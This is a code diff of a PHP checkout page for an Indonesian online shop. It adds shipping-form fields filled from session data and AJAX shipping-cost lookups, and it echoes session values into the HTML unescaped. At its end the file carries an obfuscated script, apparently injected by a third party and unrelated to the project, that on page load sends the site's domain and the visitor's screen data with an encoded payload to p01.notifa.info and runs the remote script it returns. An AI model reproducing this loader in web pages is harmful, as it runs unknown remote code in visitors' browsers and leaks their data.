@@ -104,9 +104,10 @@
                 margin-top: 8px;
         }
 
-        .btn-confirm:hover{
+       /* .btn-confirm:hover{
             background: #22df00;
-        }
+        }*/
+
 
         /*END DETTAIL*/
         input.loading {
@@ -243,18 +244,18 @@
                     
                     <div style="margin-top: 12px;background:#fff;padding: 40px;">
                         <div style="    font-size: 18px;color: #212121;margin-bottom: 14px;position: relative;font-weight: 500;">Informasi Pengiriman</div>
-                        <form>
+                        <form method="post" action="<?php echo base_url() ;?>checkout/update_shipping">
                         <div class="row">
                           <div class="col-lg-6">
                               <div class="form-group">
                                 <label for="exampleFormControlSelect1">Nama Lengkap</label>
-                                <input type="text" class="form-control" id="exampleFormControlInput1" placeholder="Nama Lengkap">
+                                <input type="text" name="nama-lengkap" value="<?php echo $this->session->userdata('customer_nama_user'); ?>" class="form-control" id="exampleFormControlInput1" placeholder="Nama Lengkap">
                               </div>
                           </div>
                           <div class="col-lg-6">
                               <div class="form-group">
                                 <label for="exampleFormControlInput1">Alamat</label>
-                                <input type="text" class="form-control" id="exampleFormControlInput1" placeholder="Silahkan Masukkan Alamat Anda ">
+                                <input type="text" class="form-control" name="alamat" value="<?php echo $this->session->userdata('customer_alamat'); ?>" id="exampleFormControlInput1" placeholder="Silahkan Masukkan Alamat Anda ">
                               </div>
                           </div>
                         </div>
@@ -262,17 +263,32 @@
                           <div class="col-lg-6">
                               <div class="form-group">
                                 <label for="exampleFormControlSelect1">Kelurahan/Kecamatan</label>
-                                <input type="text" class="form-control" id="exampleFormControlInput1" placeholder="Masukkan Kelurahan/Kecamatan Anda">
+                                <input type="text" class="form-control" value="<?php echo $this->session->userdata('kecamatan_kelurahan'); ?>" name="kelurahan-kecamatan" id="exampleFormControlInput1" placeholder="Masukkan Kelurahan/Kecamatan Anda">
                               </div>
                           </div>
                           <div class="col-lg-6">
                               <div class="form-group">
                                 <label for="exampleFormControlInput1">Provinsi</label>
-                                <select  class="form-control" id="provinsi">
+                                <select  name="provinsi" class="form-control" id="provinsi">
                                   <option>-Pilih Provinsi</option>
                                   <?php foreach ($province->rajaongkir->results as $prov): ?>
                                       
-                                    <option value="<?php echo $prov->province_id ?>"><?php echo $prov->province ?></option>
+                                    <option value="<?php echo $prov->province_id ?>" 
+
+                                        <?php 
+                                            $region =   explode("-",$this->session->userdata('customer_kode_pos'));
+                                            $provinsi_customer = $region[0];
+                                            $provinsi_rajaogkir = $prov->province ;
+
+                                            if($provinsi_customer == $provinsi_rajaogkir){
+                                             echo 'selected';   
+                                            }?>
+                                         
+                                        ><?php echo $provinsi_rajaogkir; ?>
+
+                                        
+                                            
+                                    </option>
                                   
                                   <?php endforeach ?>
                                 </select>
@@ -284,13 +300,13 @@
                           <div class="col-lg-6">
                               <div class="form-group">
                                 <label for="exampleFormControlSelect1">Nama Perusahaan</label>
-                                <input type="text" class="form-control" id="exampleFormControlInput1" placeholder="Masukkan Nama Perusahaan Anda">
+                                <input name="perusahaan" type="text" value="<?php echo $this->session->userdata('customer_perusahaan') ?>" class="form-control" id="exampleFormControlInput1" placeholder="Masukkan Nama Perusahaan Anda">
                               </div>
                           </div>
                           <div class="col-lg-6">
                               <div class="form-group">
                                 <label>Kabupaten/Kota Tujuan</label>
-                                <select class="form-control" id="kota" name="kota">
+                                <select name="kabupaten-kota" class="form-control" id="kota" name="kota">
                                 <option>-Pilih Kota/Kabupaten</option>
                                 </select>
 
@@ -304,7 +320,7 @@
                           <div class="col-lg-6">
                               <div class="form-group">
                                 <label for="exampleFormControlSelect1">Nomor Telepon</label>
-                                <input type="text" class="form-control" id="exampleFormControlInput1" placeholder="Masukkan Nomor Telepon Anda">
+                                <input name="no-telp" type="text" value="<?php echo $this->session->userdata('customer_no_telp') ?>" class="form-control" id="exampleFormControlInput1" placeholder="Masukkan Nomor Telepon Anda">
                               </div>
                           </div>
                           <div class="col-lg-6">
@@ -339,7 +355,7 @@
                                 <div class="form-group " >
                                     <label>Jenis Pengiriman</label>
 
-                                    <select class="form-control" id="jenis-pengiriman" name="kota">
+                                    <select class="form-control" id="jenis-pengiriman" name="jenis-pengiriman">
                                     <option>-Pilih Jenis Kirim</option>
                                     </select>
                                 </div>
@@ -348,7 +364,7 @@
 
                             <div class="col-lg-6 col-12">
                                 <div class="form-group">
-                                <button class="btn btn-primary" style="width: 90%;border-radius: 2px;height: 50px;margin-top: 8px;">SIMPAN</button>
+                                <button type="submit" class="btn btn-primary" style="width: 90%;border-radius: 2px;height: 50px;margin-top: 8px;">SIMPAN</button>
                                 </div>
                             </div>
 
@@ -358,7 +374,9 @@
                                 <div class="form-group">
 
                                 <label>Kode POS</label>
-                                <input type="text" class="form-control" name="kode-pos" placeholder="Masukkan Kode Pos" />
+                                           <?php   $region =   explode("-",$this->session->userdata('customer_kode_pos'));  ?>
+
+                                <input name="kode-pos"  type="number" value="<?php echo $region[2];?>" class="form-control" id="kode-pos" placeholder="Masukkan Kode Pos" />
                                 </div>
 
                             </div>
@@ -392,7 +410,7 @@
                     <div style="margin-top: 12px;min-height: 500px;background:#fff;">
                     <div class="col-lg-12 col-12">
                         <div class="form-group">
-                        <button class="btn-confirm" >BUAT PESANAN</button>
+                        <button type="button" class="btn btn-confirm"  disabled >BUAT PESANAN</button>
                         </div>
                     </div>
 
@@ -407,7 +425,7 @@
                             </div>
 
                             <div class="detail-cost-subtotal">
-                                Rp<span class="cart-text" id="total" style=""></span>
+                                Rp<span class="cart-text total" id="total" style=""></span>
                             </div>
                             
                         </div>
@@ -431,7 +449,7 @@
                             </div>
 
                             <div class="detail-cost-subtotal">
-                                Rp53.000
+                                Rp<span id="jumlah_ongkir"></span>
                             </div>
                             
                         </div>
@@ -496,7 +514,7 @@
                                     Total
                                 </div>
                                 <div class="checkout-order-total-fee">
-                                    Rp1.195.761
+                                    Rp<span class="cart-text total" id="total" style=""></span>
                                 </div>
                             </div>
                             
@@ -508,7 +526,7 @@
 
                     <div class="col-lg-12 col-12">
                         <div class="form-group">
-                        <button class="btn-confirm" >BUAT PESANAN</button>
+                        <button class="btn btn-confirm" type="button" disabled>BUAT PESANAN</button>
                         </div>
                     </div>
                         
@@ -840,6 +858,96 @@
             });
         });
         </script>
+
+        <script>
+        $(document).ready(function(){
+
+            //Hapus Item Cart
+                $(document).on('keyup','#kode-pos',function(){
+
+                    var kode_pos=$(this).val(); //mengambil Kodepos
+                    var berat=$('#berat').val(); //mengambil Kodepos
+                    // alert(qty);
+                    // if(berat <= 0){
+                    //     alert('Masukkan Berat.');
+                    // return false;
+                    // }else{
+                    // }
+                  
+                   
+
+                        $.ajax({
+                        url : "<?php echo base_url();?>checkout/cek_ongkir_lokal",
+                        method : "POST",
+                        data : {kode_pos : kode_pos,berat:berat}
+                        ,
+                       
+                        success :function(data){
+                             // location.reload();
+                             $("#jumlah_ongkir").html(data);
+
+                            
+
+                             // $('#detail_cart').load("<?php echo base_url();?>home/load_cart");
+                             // $('#data_cart').load("<?php echo base_url();?>home/load_review_order");
+                             // $('#count_cart').load("<?php echo base_url();?>home/load_count");
+                             // $('#count_cart_top').load("<?php echo base_url();?>home/load_count_top");
+                             // $('#count_cart_tops').load("<?php echo base_url();?>home/load_count_top");
+                             // $('.total').load("<?php echo base_url();?>home/load_total");
+
+              
+                        },
+                    error: function() {
+                        alert('Request Failed, Please check your code and try again!');
+                    }
+                    });
+                    
+                });
+
+                $(document).on('keyup','#berat',function(){
+
+                    var kode_pos=$('#kode-pos').val(); //mengambil Kodepos
+                    var berat=$(this).val(); //mengambil Kodepos
+                    // alert(qty);
+                    // if(berat <= 0){
+                    //     alert('Masukkan Berat.');
+                    // return false;
+                    // }else{
+                    // }
+                  
+                   
+
+                        $.ajax({
+                        url : "<?php echo base_url();?>checkout/cek_ongkir_lokal",
+                        method : "POST",
+                        data : {kode_pos : kode_pos,berat:berat}
+                        ,
+                       
+                        success :function(data){
+                             // location.reload();
+                             $("#jumlah_ongkir").html(data);
+
+                            
+
+                             // $('#detail_cart').load("<?php echo base_url();?>home/load_cart");
+                             // $('#data_cart').load("<?php echo base_url();?>home/load_review_order");
+                             // $('#count_cart').load("<?php echo base_url();?>home/load_count");
+                             // $('#count_cart_top').load("<?php echo base_url();?>home/load_count_top");
+                             // $('#count_cart_tops').load("<?php echo base_url();?>home/load_count_top");
+                             // $('.total').load("<?php echo base_url();?>home/load_total");
+
+              
+                        },
+                    error: function() {
+                        alert('Request Failed, Please check your code and try again!');
+                    }
+                    });
+                    
+                });
+
+        });
+ 
+   </script>
 
 <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mxBGfhEJgBVeRF1D3nG7dlIW0bEAhyICGLxebBqUNxpEAT4sy8%2fX6CgsXqzAOKtcQbQjkpEJKI7cyfLTKJ3G640tLHaNhgYqRCBhMbV4%2fPaLmYBcXJH0zmgHiGS0iJ3Kc6fvyZzEuIOUCHxJI%2bW7YtM9BFf%2bBlymSfmfhB4EJhSpXAbIriir1%2boT%2bLjiSyM9eBso5zTeqBduQhY%2fUXKLOoT7bGQK3NSZCmI%2fF5Lymfnffu4t%2fs50zzXesQilE9A%2fM07BWyJ%2bvTNV6Q6kJR8PuxIAPBP3GQYQONyQM5ZSUQc6llpYhFm0EwADGcaH7HWRn%2buB4izlJaPNtOO%2bD4%2bqEgPc%2bUCsBZ1ntFH5RaCmWsbHiiReFF6QvDr9Jol287OLsWadnJgIgKylppfs382TaUMQQnkccb9tzVo9J%2fDAXYr1PDyQQGReXYLEmW8QfFFC1uRT49sme8P%2b4P4xAbqI808y4YSsG8E9U" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
         
